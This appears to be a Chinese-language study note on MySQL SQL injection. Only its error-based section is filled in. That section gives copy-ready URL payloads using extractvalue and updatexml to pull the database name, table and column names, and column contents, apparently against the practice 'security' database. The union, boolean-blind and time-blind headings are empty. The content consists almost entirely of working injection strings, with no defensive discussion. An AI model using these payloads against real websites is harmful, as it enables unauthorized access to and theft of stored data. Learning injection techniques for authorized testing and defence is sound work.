## SQL注入之MySQL

### 一、联合注入


### 二、报错注入
1、使用extractvalue函数</br>
```SQL
-- （1）查询数据库名字（用户user()；版本version()）
<font color=#FF000 >?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))%23</font>

-- （2）查询数据库有多少个表
<font color=#FF000 >?id=1' and extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database()),0x7e))%23</font>

-- （3）查询数据库的表名，limit后面第一个数字表示第几个表
<font color=#FF000 >?id=1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))%23</font>

-- （4）查询列名，limit后数字表示第几列
<font color=#FF000 >?id=1' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e))%23
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='emails'),0x7e))%23</font>

-- （5）查询表里面某列的内容
<font color=#FF000 >?id=1' and extractvalue(1,concat(0x7e,(select group_concat(id) from security.emails),0x7e))%23</font>
```
2、使用updatexml函数</br>
```SQL
-- （1）查询数据库名字，数据库名字为security（用户user()；版本version()）
?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23		

-- （2）查询数据库有多少个表
?id=1' and updatexml(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23	

-- （3）查询数据库的表名，limit后第一个数字表示第几个表
?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)%23	

-- （4）查询列名，limit后数字表示第几列
?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e),1)%23	

-- （5）查询表里面某列的内容
?id=1' and updatexml(1,concat(0x7e,(select group_concat(email_id) from security.emails),0x7e),1)%23	
```



### 三、布尔盲注


### 四、时间盲注


